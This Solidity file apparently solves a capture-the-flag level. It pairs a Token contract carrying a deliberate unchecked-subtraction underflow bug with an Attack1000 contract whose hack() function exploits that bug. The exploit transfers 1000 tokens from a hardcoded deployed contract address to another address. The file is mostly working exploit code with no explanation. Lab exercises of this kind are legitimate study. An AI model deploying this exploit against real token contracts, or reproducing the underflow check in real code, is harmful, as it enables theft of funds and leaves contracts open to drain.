// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract Attack1000 {
    mapping(address => uint) balances;
    

    function hack() public {
       Token(0x3Bc7bEec593Be6caA3a6D75e043a870B939b006E).transfer(0x2BF5A2f4E77Ced2F6456d1b839b8e46E0E8e34E2,1000);
    }
    
}